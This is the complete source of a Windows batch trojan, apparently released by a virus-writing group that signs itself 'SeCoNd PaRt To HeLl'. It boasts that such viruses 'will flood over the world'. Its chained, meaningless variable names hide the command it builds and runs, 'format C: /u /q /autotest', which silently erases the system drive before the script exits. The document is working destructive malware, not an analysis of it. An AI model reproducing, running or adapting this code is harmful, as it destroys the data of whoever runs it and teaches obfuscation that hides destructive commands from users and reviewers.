   ReM Trojan.BAT.SpecialSign
   ReM by SeCoNd PaRt To HeLl
   ReM www.spth.de.vu
   ReM Such viruses will flood over the world...
   set µµ_(=s
   %µµ_(%et :.:.:=e
   %µµ_(%%:.:.:%t @@@=t
   %µµ_(%%:.:.:%%@@@% .:.:.=%µµ_(%%:.:.:%%@@@%
   %.:.:.% ääöäöüöü=o
   %.:.:.% @_@=rm
   %.:.:.% @@=fo
   %.:.:.% .-.-=C
   %.:.:.% ...=at
   %.:.:.% ____=x
   %.:.:.% _____=i
   %.:.:.% ....=:
   %.:.:.% äöüöäüöü=a
   %.:.:.% äöäöäüöü=q
   %.:.:.% äöüäöüäö=/
   %.:.:.% üäöüäöüö=u

   %.:.:.% @=%@@%%@_@%%...% %.-.-%%....% %äöüäöüäö%%üäöüäöüö% %äöüäöüäö%%äöäöäüöü% %äöüäöüäö%%äöüöäüöü%%üäöüäöüö%%@@@%%ääöäöüöü%%@@@%%:.:.:%%µµ_(%%@@@%
   %@%
   %:.:.:%%____%%_____%%@@@%
